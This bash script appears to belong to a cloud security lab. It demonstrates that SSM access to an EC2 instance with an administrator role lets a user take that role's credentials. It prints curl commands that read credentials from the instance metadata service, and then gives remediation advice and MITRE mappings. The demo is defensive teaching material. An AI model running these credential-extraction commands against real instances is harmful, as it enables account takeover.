#!/bin/bash

# Demo script for CSPM Misconfiguration: EC2 Instance with Privileged Role
#
# This demonstrates the risk detected by CSPM:
# "EC2 instance should not have a highly privileged IAM role attached to it"
#
# The demo shows that anyone with SSM access to this instance can extract
# administrative credentials from the Instance Metadata Service (IMDS).


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
DEMO_USER="pl-cspm-ec2-001-demo-user"
ADMIN_ROLE="pl-cspm-ec2-001-admin-role"

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}CSPM Misconfiguration Demo${NC}"
echo -e "${CYAN}EC2 Instance with Privileged Role${NC}"
echo -e "${CYAN}========================================${NC}\n"

echo -e "${YELLOW}CSPM Check:${NC} aws-ec2-instance-ec2-instance-should-not-have-a-highly-privileged-iam-role-attached-to-it"
echo -e "${YELLOW}Severity:${NC} HIGH"
echo ""
echo -e "${BLUE}This demo shows the risk:${NC}"
echo "Anyone with SSM access to this instance can extract admin credentials."
echo ""

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_cspm_misconfig_cspm_ec2_001_instance_with_privileged_role.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract configuration from the grouped output
DEMO_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.demo_user_access_key_id')
DEMO_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.demo_user_secret_access_key')
INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_instance_id')
EC2_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ec2_admin_role_name')
CSPM_CHECK=$(echo "$MODULE_OUTPUT" | jq -r '.cspm_check')
MISCONFIG_SUMMARY=$(echo "$MODULE_OUTPUT" | jq -r '.misconfiguration_summary')

if [ "$DEMO_ACCESS_KEY_ID" == "null" ] || [ -z "$DEMO_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$INSTANCE_ID" == "null" ] || [ -z "$INSTANCE_ID" ]; then
    echo -e "${RED}Error: Could not extract instance ID from terraform output${NC}"
    echo "The EC2 instance may not be ready yet. Wait a few minutes and try again."
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo -e "${CYAN}Misconfiguration Detected:${NC}"
echo "  $MISCONFIG_SUMMARY"
echo ""
echo "Demo User: $DEMO_USER"
echo "Instance ID: $INSTANCE_ID"
echo "Privileged Role: $EC2_ROLE_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with demo user (simulating someone with SSM access)
echo -e "${YELLOW}Step 2: Simulating a user with SSM access to this instance${NC}"
export AWS_ACCESS_KEY_ID=$DEMO_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$DEMO_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

# Verify demo user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"
echo -e "${GREEN}✓ Authenticated as user with SSM access${NC}\n"

# Step 3: Show the user does NOT have admin permissions
echo -e "${YELLOW}Step 3: Verifying demo user has limited permissions${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ User unexpectedly has IAM permissions${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Demo user cannot list IAM users${NC}"
fi
echo ""

# Step 4: Check SSM agent status
echo -e "${YELLOW}Step 4: Checking if instance is ready for SSM session${NC}"

MAX_RETRIES=5
RETRY_COUNT=0
SSM_READY=false

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    SSM_STATUS=$(aws ssm describe-instance-information \
        --region $AWS_REGION \
        --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
        --query 'InstanceInformationList[0].PingStatus' \
        --output text 2>/dev/null || echo "")

    if [ "$SSM_STATUS" = "Online" ]; then
        echo -e "${GREEN}✓ SSM agent is online and ready${NC}"
        SSM_READY=true
        break
    else
        RETRY_COUNT=$((RETRY_COUNT + 1))
        if [ $RETRY_COUNT -lt $MAX_RETRIES ]; then
            echo "SSM agent not ready yet (attempt $RETRY_COUNT/$MAX_RETRIES), waiting 10 seconds..."
            sleep 10
        fi
    fi
done

if [ "$SSM_READY" = false ]; then
    echo -e "${RED}Error: SSM agent is not ready on instance $INSTANCE_ID${NC}"
    echo "The instance may still be initializing. Please wait a few minutes and try again."
    exit 1
fi
echo ""

# Step 5: Interactive SSM session
echo -e "${YELLOW}Step 5: Demonstrating the risk - SSM access to privileged instance${NC}"
echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}THE RISK: SSM ACCESS = ADMIN ACCESS${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo "This instance has a role with AdministratorAccess attached."
echo "Anyone who can start an SSM session can extract admin credentials from IMDS."
echo ""
echo -e "${YELLOW}Once connected, run these commands to extract admin credentials:${NC}"
echo ""
echo -e "${GREEN}# Step 1: Get IMDSv2 token${NC}"
echo 'TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)'
echo ""
echo -e "${GREEN}# Step 2: Get the role name${NC}"
echo 'ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)'
echo 'echo "Role: $ROLE_NAME"'
echo ""
echo -e "${GREEN}# Step 3: Extract admin credentials${NC}"
echo 'curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null | jq .'
echo ""
echo -e "${RED}These credentials have AdministratorAccess to your AWS account!${NC}"
echo ""
echo -e "${YELLOW}Type 'exit' to leave the session when done.${NC}"
echo ""
echo -e "${CYAN}========================================${NC}"
echo ""
echo "Press ENTER to start the SSM session..."
read

# Start the interactive session
show_attack_cmd "Attacker" "aws ssm start-session --region $AWS_REGION --target $INSTANCE_ID"
aws ssm start-session \
    --region $AWS_REGION \
    --target $INSTANCE_ID

# After session ends
echo ""
echo -e "${GREEN}✓ SSM session ended${NC}\n"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

# Step 6: Summarize the risk
echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}CSPM MISCONFIGURATION RISK SUMMARY${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo -e "${RED}FINDING:${NC} $CSPM_CHECK"
echo ""
echo -e "${YELLOW}What this misconfiguration means:${NC}"
echo "  - The EC2 instance has AdministratorAccess via its instance role"
echo "  - ANYONE with access to this instance can extract admin credentials"
echo ""
echo -e "${YELLOW}Access vectors that could exploit this:${NC}"
echo "  - SSM Session Manager access (demonstrated above)"
echo "  - SSH access (if enabled)"
echo "  - Exploitation of vulnerable software on the instance"
echo "  - Compromised applications running on the instance"
echo "  - Supply chain attacks (malicious packages/AMIs)"
echo ""
echo -e "${YELLOW}Recommended remediation:${NC}"
echo "  1. Follow least privilege - only grant permissions the instance needs"
echo "  2. Remove AdministratorAccess from the instance role"
echo "  3. Use specific IAM policies for required operations"
echo "  4. Consider using AWS Secrets Manager for sensitive credentials"
echo "  5. Enforce IMDSv2 to add an extra layer of protection"
echo ""
echo -e "${BLUE}MITRE ATT&CK Techniques:${NC}"
echo "  - T1552.005: Unsecured Credentials: Cloud Instance Metadata API"
echo "  - T1078.004: Valid Accounts: Cloud Accounts"
echo ""
echo -e "${YELLOW}To clean up demo artifacts:${NC} ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
